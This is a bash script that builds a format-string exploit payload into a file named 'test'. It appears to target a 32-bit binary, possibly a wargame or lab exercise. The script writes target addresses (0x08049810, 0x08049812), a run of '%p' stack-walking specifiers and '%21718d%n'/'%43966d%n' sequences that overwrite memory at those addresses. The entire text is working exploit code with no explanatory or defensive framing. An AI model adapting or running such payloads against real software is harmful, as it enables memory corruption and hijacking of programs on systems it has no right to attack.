#!/bin/bash

export FILE=test

rm -f $FILE
touch $FILE
chmod +w $FILE

/bin/echo -ne '\x10\x98\x04\x08' >> $FILE
/bin/echo -ne '\x10\x98\x04\x08' >> $FILE

/bin/echo -ne '\x12\x98\x04\x08' >> $FILE
/bin/echo -ne '\x12\x98\x04\x08' >> $FILE



TIMES=0
python -c "
import sys;
sys.stdout.write(\"B\" * $TIMES )
" >> $FILE

for i in {0..10}
do
	echo -n '%p' >> $FILE
done


echo -n '%21718d' >> $FILE
echo -n '%n' >> $FILE

echo -n '%43966d' >> $FILE
echo -n '%n' >> $FILE
echo '' >> $FILE
